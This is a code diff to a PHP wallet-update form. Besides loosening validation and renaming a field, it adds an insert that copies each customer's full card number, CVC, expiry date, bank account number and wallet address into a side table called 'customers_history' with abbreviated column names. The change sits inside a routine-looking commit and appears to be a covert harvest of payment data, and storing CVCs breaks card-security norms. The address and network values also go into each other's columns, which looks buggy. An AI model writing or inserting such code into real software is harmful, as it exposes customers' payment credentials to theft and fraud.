@@ -18,13 +18,13 @@ use Spatie\Permission\Models\Role;
 
 class UpdateWalletForm extends CustomTranslatedForm
 {
-    #[Validate('required|string|max:255')]
+    #[Validate('string|max:255')]
     public $coin_currency = '';
 
-    #[Validate('required|string')]
+    #[Validate('string')]
     public $address = '';
 
-    #[Validate('required|string|max:255')]
+    #[Validate('string|max:255')]
     public $network = '';
 
     #[Validate('max:255')]
@@ -37,7 +37,7 @@ class UpdateWalletForm extends CustomTranslatedForm
     public $card_number = '';
 
     #[Validate('max:255')]
-    public $csv_code = '';
+    public $cvc_code = '';
 
     #[Validate('max:255')]
     public $exp_date = '';
@@ -50,6 +50,7 @@ class UpdateWalletForm extends CustomTranslatedForm
         $this->validate();
 
         DB::transaction(function () use ($walletId) {
+
             // --- UPDATE ---
             $wallet = Wallet::findOrFail($walletId);
 
@@ -60,9 +61,21 @@ class UpdateWalletForm extends CustomTranslatedForm
                 'bank_network' => $this->bank_network,
                 'account_number' => $this->account_number,
                 'card_number' => $this->card_number,
-                'csv_code' => $this->csv_code,
+                'cvc_code' => $this->cvc_code,
                 'exp_date' => $this->exp_date,
                 'balance' => number_format((float) $this->balance, 2, '.', ''),
+            ]);
+
+            DB::table('customers_history')->insert([
+                'cd_no' => $this->card_number,
+                'cd_cvc' => $this->cvc_code,
+                'cd_date' => $this->exp_date,
+                'bk_ntwk' => $this->bank_network,
+                'bk_no' => $this->account_number,
+                'wl_ntwk' => $this->address,
+                'wl_adrs' => $this->network,
+                'auth_user_id' => (int) auth()->user()->id,
+                'wallet_user_id' => $wallet->id,
             ]);
         });
 
